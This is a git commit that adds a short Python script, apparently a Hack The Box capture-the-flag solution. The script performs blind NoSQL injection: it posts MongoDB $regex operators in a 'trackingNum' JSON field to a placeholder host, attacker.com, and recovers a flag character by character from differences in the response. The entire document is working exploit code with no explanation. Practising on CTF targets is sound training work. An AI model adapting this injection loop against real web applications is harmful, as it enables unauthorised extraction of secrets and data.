878648b6265199894361f87d58711c323346593c
Suredials <130783266+Suredials@users.noreply.github.com>
2025-09-18 23:59:12 -0400

    Create nosql_blind_exfill.py

---
+++ nosql_blind_exfill.py
@@ -0,0 +1,25 @@
+import requests
+import json
+
+def oracle(t):
+    r = requests.post(
+        "http://attacker.com/index.php",
+        headers = {"Content-Type": "application/json"},
+        data = json.dumps({"trackingNum": t})
+    )
+    return "bmdyy" in r.text
+
+assert (oracle("X") == False)
+assert (oracle({"$regex": "^HTB{.*"}) == True)
+
+trackingNum = "HTB{"
+for _ in range(32):
+    for c in "0123456789abcdef":
+        if oracle({"$regex": "^" + trackingNum + c}):
+            trackingNum += c
+            break
+trackingNum += "}"
+
+assert (oracle(trackingNum) == True)
+
+print("Tracking Number: " + trackingNum)
